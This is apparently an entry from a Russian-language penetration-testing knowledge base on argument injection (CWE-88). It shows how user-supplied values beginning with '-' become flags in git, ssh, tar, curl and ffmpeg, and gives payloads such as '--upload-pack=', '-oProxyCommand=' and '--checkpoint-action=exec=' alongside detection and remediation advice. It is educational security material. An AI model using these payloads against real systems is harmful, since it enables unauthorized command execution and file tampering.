---
id: cmdi-argument-injection
title: "Argument injection: shell не нужен, опасны флаги"
type: cmdi
target: generic
category: web
difficulty: advanced
bypass: none
tags: [cmdi, argument-injection, ssh, git, curl]
tested_on: ["OpenSSH", "git", "curl", "tar", "ffmpeg"]
success_rate: 0.5
risk: high
cwe: "CWE-88"
lab: null
last_verified: "2026-10-23"
references:
  - "https://owasp.org/www-community/attacks/Command_Injection"
graph:
  - target: "cmdi"
    type: instance_of
  - target: "rce"
    type: leads_to
---

# Argument injection: shell не нужен, опасны флаги

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
--upload-pack=touch /tmp/pwned
```

## Explanation

Даже при корректном вызове без shell (`execve` с массивом аргументов) пользовательские
данные могут попасть в позицию АРГУМЕНТА и изменить поведение программы:

- `ssh`: `--proxy-command=...`, `-o ProxyCommand=...` -> выполнение команды
- `git`: `--upload-pack=`, `ext::sh -c ...`, `--exec=` -> RCE
- `curl`: `-o /path` (запись файла), `--config` (чтение локального файла)
- `tar`: `--checkpoint=1 --checkpoint-action=exec=...` -> RCE
- `ffmpeg`: `-f concat` + плейлист -> чтение локальных файлов
- `find`: `-exec`, `awk`: `system()`, `rsync`: `-e`

Ключевой маркер: значение начинается с `-` и воспринимается как флаг.

## Detection

Проверьте, что происходит при значении, начинающемся с `-`: ошибки парсинга флагов
(`unknown option`), изменение поведения. Ищите в коде вызовы внешних утилит
с пользовательскими аргументами (taint-анализ).

## Remediation

- Разделитель `--` перед пользовательскими аргументами: всё после него — не флаги.
- Валидация: запрет значений, начинающихся с `-`.
- Whitelist допустимых аргументов.
- Обновление утилит: часть векторов (git ext::, ssh ProxyCommand) закрыта политиками
  `GIT_ALLOW_PROTOCOL`, `protocol.ext.allow=never`.

## Variants

```
-oProxyCommand=touch /tmp/x
```

```
--checkpoint-action=exec=touch /tmp/x
```

```
-o /var/www/html/x.txt
```
